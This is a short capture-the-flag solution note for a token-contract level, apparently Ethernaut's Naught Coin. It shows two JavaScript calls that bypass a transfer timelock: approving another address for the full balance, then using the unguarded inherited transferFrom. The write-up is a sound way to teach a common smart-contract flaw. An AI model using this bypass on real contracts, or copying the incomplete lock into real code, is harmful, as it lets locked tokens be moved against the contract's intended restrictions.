/*
Non custom implementation of the `transferFrom` function enforcing the
`lockTokens` modifier.
Let's take advantage of it to transfer the tokens to another address.

 1. Approve another address to transfer tokens on your behalf
const balance = await contract.balanceOf(player);
await contract.approve("TheFutureCoinOwner", balance);

 2. Transfer the tokens to another address using the transferFrom function
await contract.transferFrom(player, "TheFutureCoinOwner", balance);


ðŸŽ‰ Level completed! ðŸŽ‰
